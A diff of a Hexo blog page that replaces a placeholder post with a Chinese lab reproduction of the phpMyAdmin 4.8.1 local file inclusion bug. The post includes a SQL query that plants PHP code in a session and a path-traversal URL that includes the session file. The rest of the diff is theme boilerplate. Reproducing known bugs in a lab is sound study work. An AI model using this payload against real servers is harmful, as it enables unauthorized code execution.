@@ -6,18 +6,25 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://shh4757.github.io">
-  <title>myfirseblog | Hexo</title>
+  <title>phpMyAdmin4.8.x漏洞复现 | sleepyde1b</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="article">
-<meta property="og:title" content="myfirseblog">
-<meta property="og:url" content="http://shh4757.github.io/2019/07/28/myfirseblog/index.html">
-<meta property="og:site_name" content="Hexo">
+  <meta name="description" content="​        ChaMd5安全团队公开了一个phpMyAdmin4.8版本的本地文件包含漏洞：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpMyAdmin4.8.x漏洞复现">
+<meta property="og:url" content="http://shh4757.github.io/2019/07/28/shh/index.html">
+<meta property="og:site_name" content="sleepyde1b">
+<meta property="og:description" content="​        ChaMd5安全团队公开了一个phpMyAdmin4.8版本的本地文件包含漏洞：">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-07-28T07:35:49.176Z">
+<meta property="og:image" content="https://s2.ax1x.com/2019/07/28/e1pNrV.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/07/28/e19Dw8.md.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/07/28/e1ER4f.md.png">
+<meta property="og:updated_time" content="2019-07-28T13:23:44.240Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="myfirseblog">
+<meta name="twitter:title" content="phpMyAdmin4.8.x漏洞复现">
+<meta name="twitter:description" content="​        ChaMd5安全团队公开了一个phpMyAdmin4.8版本的本地文件包含漏洞：">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/07/28/e1pNrV.md.png">
   
-    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+    <link rel="alternative" href="/atom.xml" title="sleepyde1b" type="application/atom+xml">
   
   
     <link rel="icon" href="/favicon.png">
@@ -44,11 +51,13 @@
 <div class="intrude-less">
 	<header id="header" class="inner">
 		<a href="/" class="profilepic">
-			<img src="" class="js-avatar">
+			<img src="/pic/dog.png" class="js-avatar">
 		</a>
 		<hgroup>
-		  <h1 class="header-author"><a href="/">John Doe</a></h1>
+		  <h1 class="header-author"><a href="/">shh</a></h1>
 		</hgroup>
+		
+		<p class="header-subtitle">不喜说话</p>
 		
 
 		<nav class="header-menu">
@@ -56,16 +65,10 @@
 			
 				<li><a href="/">主页</a></li>
 	        
-				<li><a href="/tags/随笔/">随笔</a></li>
-	        
 			</ul>
 		</nav>
 		<nav class="header-smart-menu">
     		
-    			
-    			<a q-on="click: openSlider(e, 'innerArchive')" href="javascript:void(0)">所有文章</a>
-    			
-            
     			
     			<a q-on="click: openSlider(e, 'friends')" href="javascript:void(0)">友链</a>
     			
@@ -78,13 +81,7 @@
 		<nav class="header-nav">
 			<div class="social">
 				
-					<a class="github" target="_blank" href="#" title="github"><i class="icon-github"></i></a>
-		        
-					<a class="weibo" target="_blank" href="#" title="weibo"><i class="icon-weibo"></i></a>
-		        
-					<a class="rss" target="_blank" href="#" title="rss"><i class="icon-rss"></i></a>
-		        
-					<a class="zhihu" target="_blank" href="#" title="zhihu"><i class="icon-zhihu"></i></a>
+					<a class="github" target="_blank" href="https://shh4757.github.io" title="github"><i class="icon-github"></i></a>
 		        
 			</div>
 		</nav>
@@ -102,15 +99,15 @@
 	<div class="intrude-less">
 		<header id="header" class="inner">
 			<div class="profilepic">
-				<img src="" class="js-avatar">
+				<img src="/pic/dog.png" class="js-avatar">
 			</div>
 			<hgroup>
-			  <h1 class="header-author js-header-author">John Doe</h1>
+			  <h1 class="header-author js-header-author">shh</h1>
 			</hgroup>
 			
+			<p class="header-subtitle"><i class="icon icon-quo-left"></i>不喜说话<i class="icon icon-quo-right"></i></p>
 			
 			
-				
 			
 				
 			
@@ -119,13 +116,7 @@
 			<nav class="header-nav">
 				<div class="social">
 					
-						<a class="github" target="_blank" href="#" title="github"><i class="icon-github"></i></a>
-			        
-						<a class="weibo" target="_blank" href="#" title="weibo"><i class="icon-weibo"></i></a>
-			        
-						<a class="rss" target="_blank" href="#" title="rss"><i class="icon-rss"></i></a>
-			        
-						<a class="zhihu" target="_blank" href="#" title="zhihu"><i class="icon-zhihu"></i></a>
+						<a class="github" target="_blank" href="https://shh4757.github.io" title="github"><i class="icon-github"></i></a>
 			        
 				</div>
 			</nav>
@@ -134,9 +125,7 @@
 				<ul style="width: 50%">
 				
 				
-					<li style="width: 50%"><a href="/">主页</a></li>
-		        
-					<li style="width: 50%"><a href="/tags/随笔/">随笔</a></li>
+					<li style="width: 100%"><a href="/">主页</a></li>
 		        
 				</ul>
 			</nav>
@@ -151,50 +140,48 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-myfirseblog" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-shh" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      myfirseblog
+      phpMyAdmin4.8.x漏洞复现
     </h1>
   
 
         
-        <a href="/2019/07/28/myfirseblog/" class="archive-article-date">
-  	<time datetime="2019-07-28T07:35:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-28</time>
+        <a href="/2019/07/28/shh/" class="archive-article-date">
+  	<time datetime="2019-07-28T08:45:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-28</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        
-      
+        <p>​        ChaMd5安全团队公开了一个phpMyAdmin4.8版本的本地文件包含漏洞：</p>
+<a id="more"></a>
+
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd" target="_blank" rel="noopener">phpmyadmin4.8.1后台getshell</a>。该漏洞利用不要求root帐号，只需能够登录 phpMyAdmin 便能够利用。</p>
+<h3 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h3><p>​       攻击者可以在服务器上包含（查看和潜在执行）文件的漏洞被发现。该漏洞来自一部分代码，其中页面在phpMyAdmin中被重定向和加载，以及对白名单页面进行不正确测试。</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ol>
+<li><p>在LAMP环境下进入下载好的phpmyadmin4.8.1并登录，找到SQL栏，执行SQL查询</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`select &apos;&lt;?php phpinfo();exit;?&gt;&apos;`</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p><a href="https://imgchr.com/i/e1pNrV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/07/28/e1pNrV.md.png" alt="e1pNrV.md.png"></a></p>
+<p>  2.进入开发者工具在Cookie中的phpmyadmin中获取自己的session id</p>
+<p><a href="https://imgchr.com/i/e19Dw8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/07/28/e19Dw8.md.png" alt="e19Dw8.md.png"></a></p>
+<p>   这样对应的SESSION文件为<code>/var/lib/php/sessions/sess_你的SESSION ID</code>。</p>
+<p>3.包含session文件，漏洞利用成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.222/phpmyadmin/server_sql.php?target=index.php%253f/../../../../../../../../var/lib/php/session/sess_39paiubi5fdps7321f91oadsv525usle</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://imgchr.com/i/e1ER4f" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/07/28/e1ER4f.md.png" alt="e1ER4f.md.png"></a></p>
 
       
-        <div class="page-reward">
-          <a href="javascript:;" class="page-reward-btn tooltip-top">
-            <div class="tooltip tooltip-east">
-            <span class="tooltip-item">
-              赏
-            </span>
-            <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                    
-                  </div>
-                </span>
-              </span>
-            </span>
-          </div>
-          </a>
-        </div>
+
       
     </div>
     <div class="article-info article-info-index">
@@ -250,7 +237,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://shh4757.github.io/2019/07/28/myfirseblog/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://shh4757.github.io/2019/07/28/shh/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -265,8 +252,8 @@
 <nav id="article-nav">
   
   
-    <a href="/2019/07/28/hello-world/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Hello World</div>
+    <a href="/2019/07/28/test/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Maps</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -309,7 +296,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2019 John Doe
+    		&copy; 2019 shh
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
@@ -329,7 +316,7 @@
 		open_in_new: false,
 		toc_hide_index: true,
 		root: "/",
-		innerArchive: true,
+		innerArchive: false,
 		showTags: false
 	}
 </script>
@@ -353,85 +340,22 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
       
       
     
-      
-      
-      
-    
     
 
     <ul style="width: 70%">
     
     
       
-      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'innerArchive')"><a href="javascript:void(0)" q-class="active:innerArchive">所有文章</a></li>
+      <li style="width: 50%" q-on="click: openSlider(e, 'friends')"><a href="javascript:void(0)" q-class="active:friends">友链</a></li>
       
         
       
-      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'friends')"><a href="javascript:void(0)" q-class="active:friends">友链</a></li>
-      
-        
-      
-      <li style="width: 33.333333333333336%" q-on="click: openSlider(e, 'aboutme')"><a href="javascript:void(0)" q-class="active:aboutme">关于我</a></li>
+      <li style="width: 50%" q-on="click: openSlider(e, 'aboutme')"><a href="javascript:void(0)" q-class="active:aboutme">关于我</a></li>
       
         
     </ul>
   </div>
   <div class="tools-wrap">
-    
-    	<section class="tools-section tools-section-all" q-show="innerArchive">
-        <div class="search-wrap">
-          <input class="search-ipt" q-model="search" type="text" placeholder="find something…">
-          <i class="icon-search icon" q-show="search|isEmptyStr"></i>
-          <i class="icon-close icon" q-show="search|isNotEmptyStr" q-on="click:clearChose(e)"></i>
-        </div>
-        <div class="widget tagcloud search-tag">
-          <p class="search-tag-wording">tag:</p>
-          <label class="search-switch">
-            <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
-          </label>
-          <ul class="article-tag-list" q-show="showTags">
-            
-            <div class="clearfix"></div>
-          </ul>
-        </div>
-        <ul class="search-ul">
-          <p q-show="jsonFail" style="padding: 20px; font-size: 12px;">
-            缺失模块。<br/>1、请确保node版本大于6.2<br/>2、在博客根目录（注意不是yilia根目录）执行以下命令：<br/> npm i hexo-generator-json-content --save<br/><br/>
-            3、在根目录_config.yml里添加配置：
-<pre style="font-size: 12px;" q-show="jsonFail">
-  jsonContent:
-    meta: false
-    pages: false
-    posts:
-      title: true
-      date: true
-      path: true
-      text: false
-      raw: false
-      content: false
-      slug: false
-      updated: false
-      comments: false
-      link: false
-      permalink: false
-      excerpt: false
-      categories: false
-      tags: true
-</pre>
-          </p>
-          <li class="search-li" q-repeat="items" q-show="isShow">
-            <a q-attr="href:path|urlformat" class="search-title"><i class="icon-quo-left icon"></i><span q-text="title"></span></a>
-            <p class="search-time">
-              <i class="icon-calendar icon"></i>
-              <span q-text="date|dateformat"></span>
-            </p>
-            <p class="search-tag">
-              <i class="icon-price-tags icon"></i>
-              <span q-repeat="tags" q-on="click:choseTag(e, name)" q-text="name|tagformat"></span>
-            </p>
-          </li>
-        </ul>
-    	</section>
     
 
     
@@ -440,27 +364,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
         <ul class="search-ul">
           
             <li class="search-li">
-              <a href="http://localhost:4000/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>友情链接1</a>
+              <a href="https://sunian19.github.io/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>未成年</a>
             </li>
           
             <li class="search-li">
-              <a href="http://localhost:4000/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>友情链接2</a>
-            </li>
-          
-            <li class="search-li">
-              <a href="http://localhost:4000/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>友情链接3</a>
-            </li>
-          
-            <li class="search-li">
-              <a href="http://localhost:4000/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>友情链接4</a>
-            </li>
-          
-            <li class="search-li">
-              <a href="http://localhost:4000/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>友情链接5</a>
-            </li>
-          
-            <li class="search-li">
-              <a href="http://localhost:4000/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>友情链接6</a>
+              <a href="http://localhost:4000/" target="_blank" class="search-title"><i class="icon-quo-left icon"></i>老老憨</a>
             </li>
           
         </ul>
@@ -471,7 +379,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
     
     	<section class="tools-section tools-section-me" q-show="aboutme">
   	  	
-  	  		<div class="aboutme-wrap" id="js-aboutme">很惭愧&lt;br&gt;&lt;br&gt;只做了一点微小的工作&lt;br&gt;谢谢大家</div>
+  	  		<div class="aboutme-wrap" id="js-aboutme">发呆&lt;br&gt;&lt;br&gt;我很在行&lt;br&gt;</div>
   	  	
     	</section>
     
